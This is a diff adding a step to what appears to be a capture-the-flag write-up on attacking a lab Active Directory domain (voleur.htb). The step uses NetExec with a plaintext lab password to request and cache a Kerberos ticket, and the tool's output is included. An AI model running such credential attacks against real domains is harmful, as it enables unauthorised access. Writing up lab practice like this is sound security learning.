@@ -137,3 +137,12 @@ Dumped all the users to a userfile
 
 Kerberoasting and as-rep roasting both failed
 
+For ease of use ill generate a tgt for this user save typing the credentials
+
+```python
+faketime -f +8h nxc smb dc.voleur.htb -u ryan.naylor -p 'HollowOct31Nyt' -k --generate-tgt ryan_naylor 
+SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc.voleur.htb   445    dc               [+] voleur.htb\ryan.naylor:HollowOct31Nyt 
+SMB         dc.voleur.htb   445    dc               [+] TGT saved to: ryan_naylor.ccache
+SMB         dc.voleur.htb   445    dc               [+] Run the following command to use the TGT: export KRB5CCNAME=ryan_naylor.ccache
+```
